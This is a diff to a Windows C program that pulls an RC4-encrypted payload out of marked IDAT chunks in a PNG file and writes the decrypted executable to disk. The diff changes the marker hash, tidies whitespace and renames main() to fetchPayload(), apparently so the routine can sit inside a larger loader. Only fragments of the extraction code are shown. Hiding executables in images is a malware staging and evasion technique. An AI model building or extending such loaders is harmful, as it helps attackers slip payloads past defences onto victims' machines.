@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include <stdio.h>
+#include "common.h"
 
 // ---------------------------------------------------------------------------------------------------------------------------------------------
 // ---------------------------------------------------------------------------------------------------------------------------------------------
@@ -18,7 +19,7 @@
 // TO UPDATE with respect to every new created PNG:
 //
 //
-#define MARKED_IDAT_HASH	0x95D80576
+#define MARKED_IDAT_HASH	 0x772FC3A
 
 // ---------------------------------------------------------------------------------------------------------------------------------------------
 // ---------------------------------------------------------------------------------------------------------------------------------------------
@@ -93,13 +94,13 @@ VOID Rc4EncryptDecrypt(IN PBYTE pInputBuffer, IN SIZE_T sInputBuffSize, IN PBYTE
 BOOL ExtractDecryptedPayload(IN PBYTE pPngFileBuffer, IN SIZE_T sPngFileSize, OUT PBYTE* ppDecryptedBuff, OUT PSIZE_T psDecryptedBuffLength) {
 
 	SIZE_T			Offset = BYTES_TO_SKIP,
-		            sDecPayloadSize = 0x00;
+		sDecPayloadSize = 0x00;
 	DWORD			uSectionLength = 0x00;
 	CHAR			pSectionType[CHUNK_TYPE_SIZE + 1] = { 0 };
 	PBYTE			pRc4Key[RC4_KEY_SIZE] = { 0 };
 	PBYTE			pSectionBuffer = NULL,
-		            pTmpPntr = NULL,
-		            pDecPayload = NULL;
+		pTmpPntr = NULL,
+		pDecPayload = NULL;
 	UINT32			uCRC32Hash = 0x00;
 	BOOL			bFoundHash = FALSE;
 
@@ -219,7 +220,7 @@ BOOL WriteFileToDiskA(IN LPCSTR cFileName, IN PBYTE pFileBuffer, OUT DWORD dwFil
 
 	printf("[+] DONE\n");
 
-// Error handler
+	// Error handler
 _END_OF_FUNC:
 	if (hFile != INVALID_HANDLE_VALUE)
 		CloseHandle(hFile);
@@ -279,13 +280,13 @@ _END_OF_FUNC:
 // ---------------------------------------------------------------------------------------------------------------------------------------------
 
 
-int main() {
+int fetchPayload() {
 
 	PBYTE	pPngFileBuffer = NULL,
-		    pExeFileBuffer = NULL;
+		pExeFileBuffer = NULL;
 
 	SIZE_T	sPngFileSize = 0x00,
-		    sExeFileSize = 0x00;
+		sExeFileSize = 0x00;
 
 	// Read PNG file from disk
 	if (!ReadFileFromDiskA("output.png", &pPngFileBuffer, &sPngFileSize))
